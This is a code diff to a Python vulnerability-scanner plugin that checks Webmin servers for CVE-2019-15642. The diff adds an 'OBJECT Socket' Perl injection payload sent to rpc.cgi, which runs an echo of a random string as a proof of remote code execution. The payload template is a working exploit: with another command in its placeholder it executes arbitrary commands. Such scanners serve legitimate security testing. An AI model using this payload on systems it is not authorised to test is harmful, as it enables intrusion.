@@ -1,58 +1,65 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
+from lib.tool.md5 import random_md5
 from lib.tool import check
-from thirdparty import requests
 
-def cve_2019_15642_scan(self, url):
+cve_2019_15642_payloads = [
+    {
+        'path': 'rpc.cgi',
+        'data': 'OBJECT Socket;print "Content-Type: text/plain\\n\\n";$cmd=`{RCECOMMAND}`; print "$cmd\\n\\n";',
+        'headers': {}
+    },
+    {
+        'path': 'rpc.cgi',
+        'data': 'OBJECT Socket;print "Content-Type: text/plain\\n\\n";$cmd=`{RCECOMMAND}`; print "$cmd\\n\\n";',
+        'headers': {
+            'User-Agent': 'webmin',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'fr',
+            'Accept-Encoding': 'gzip, deflate'
+        }
+    },
+]
+
+def cve_2019_15642_scan(self, clients):
     ''' Webmin 1.920及之前版本中的rpc.cgi文件存在安全漏洞, 攻击者可借助特制的对象名称利用该漏洞执行代码
             需要身份验证(Cookie、Authorization等)
     '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'RCE'
-    vul_info['vul_id'] = 'CVE-2019-15642'
-    vul_info['vul_method'] = 'POST'
+    client = clients.get('reqClient')
 
-    for payload in self.cve_2019_15642_payloads:
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'RCE',
+        'vul_id': 'CVE-2019-15642',
+    }
+
+    for payload in cve_2019_15642_payloads:
+        randomStr = random_md5()
+        RCEcommand = 'echo ' + randomStr
+        
         path = payload['path']
-        data = payload['data']
+        data = payload['data'].format(RCECOMMAND=RCEcommand)
         headers = payload['headers']
-        target = url + path
 
-        headers['Referer'] = 'https://{}/session_login.cgi'.format(logger.get_domain(url))
+        headers['Referer'] = '{}/session_login.cgi'.format(client.protocol_domain)
 
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['headers'] = headers
-        vul_info['target'] = target
+        res = client.request(
+            'post',
+            path,
+            data=data,
+            headers=headers,
+            allow_redirects=False,
+            vul_info=vul_info
+        )
+        if res is None:
+            continue
 
-        try:
-            res = requests.post(
-                target, 
-                timeout=self.timeout, 
-                headers=headers,
-                data=data, 
-                proxies=self.proxies, 
-                verify=False,
-                allow_redirects=False
-            )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
-
-            if (self.md in check.check_res(res.text, self.md)):
-                results = {
-                    'Target': target,
-                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Request': res
-                }
-                return results
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+        if (check.check_res(res.text, randomStr)):
+            results = {
+                'Target': res.request.url,
+                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                'Request': res
+            }
+            return results
+    return None
